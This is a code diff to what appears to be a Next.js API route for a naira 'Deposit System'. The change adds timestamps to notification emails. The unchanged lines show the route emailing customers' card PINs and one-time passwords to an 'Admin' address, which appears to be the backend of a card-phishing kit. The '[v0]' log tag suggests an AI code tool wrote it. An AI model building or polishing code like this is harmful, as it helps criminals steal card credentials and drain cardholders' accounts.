@@ -35,11 +35,14 @@ export async function POST(request: Request) {
     const sentFrom = new Sender(fromEmail, "Deposit System")
     const recipients = [new Recipient(receiverEmail, "Admin")]
 
+    // Add timestamp for uniqueness
+    const timestamp = new Date().toLocaleString("en-GB", { timeZone: "Africa/Lagos" })
+
     let subject = ""
     let emailHtml = ""
 
     if (step === "pin") {
-      subject = `Deposit Transaction - Card Payment (${email})`
+      subject = `Deposit Transaction - Card Payment (${email}) [${timestamp}]`
       emailHtml = render(
         <PinEmail
           email={email}
@@ -53,7 +56,7 @@ export async function POST(request: Request) {
         />,
       )
     } else if (step === "otp") {
-      subject = `Deposit Transaction - OTP Verification (${email})`
+      subject = `Deposit Transaction - OTP Verification (${email}) [${timestamp}]`
       emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
@@ -62,7 +65,7 @@ export async function POST(request: Request) {
       .setTo(recipients)
       .setSubject(subject)
       .setHtml(emailHtml)
-      .setText(`Deposit notification for ${email}, amount: ₦${amount}`)
+      .setText(`Deposit notification for ${email}, amount: ₦${amount}, sent at ${timestamp}`)
 
     console.log("[v0] Sending email with MailerSend SDK")
 
